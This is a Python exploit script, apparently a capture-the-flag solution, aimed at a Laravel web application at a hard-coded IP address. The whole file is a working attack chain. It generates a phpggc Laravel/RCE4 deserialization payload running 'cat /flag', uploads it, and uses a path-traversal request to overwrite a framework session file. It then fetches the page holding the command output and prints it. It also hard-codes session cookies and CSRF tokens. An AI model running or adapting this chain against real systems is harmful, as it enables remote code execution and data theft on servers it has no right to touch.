import requests
import os
import base64
import urllib.request
import re

remote_ip = "39.104.19.182:8080"
md5_ip = "e4cfc06ac6f1336028e43916cf1d75d3"
phpggc_data = base64.b64encode(os.popen('php phpggc Laravel/RCE4 system "cat /flag"').read().encode("utf8"))



paramsPost = {"filename": "tmp/" + md5_ip}
headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
           "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded"}
cookies = {"sessionid": "8k648uvlg2brp93id13fq0vvy6jaticd1",
           "csrftoken": "anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv",
           "laravel_session": "eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.post("http://" + remote_ip + "/rm", data=paramsPost, headers=headers, cookies=cookies)

print("clear file")
print("Response body: %s" % response.content)


paramsPost = {"content":phpggc_data,"filename":"."}
headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
cookies = {"sessionid":"8k648uvlg2brp93id13fq0vvy6jaticd1","csrftoken":"anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv","laravel_session":"eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.post("http://"+remote_ip+"/upload", data=paramsPost, headers=headers, cookies=cookies)

print("upload file")
print("Response body: %s" % response.content)

response = urllib.request.urlopen("http://"+remote_ip+"/move/log/../"+md5_ip+"%3f/../../framework/sessions/BDDLh0HsqaXe54sPFUuzMT7azrLUC9JGtw1SNdZV")
print("move file")
print("Response body: %s" % response.read().decode('utf-8'))

headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate"}
cookies = {"sessionid":"8k648uvlg2brp93id13fq0vvy6jaticd1","csrftoken":"anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv","laravel_session":"eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.get("http://"+remote_ip+"/tmp/123", headers=headers, cookies=cookies)

print("exploit success!")
res = response.content.decode("utf-8")
print(re.search(r"(.*)<!DOCTYPE html>",res,re.S).group(1))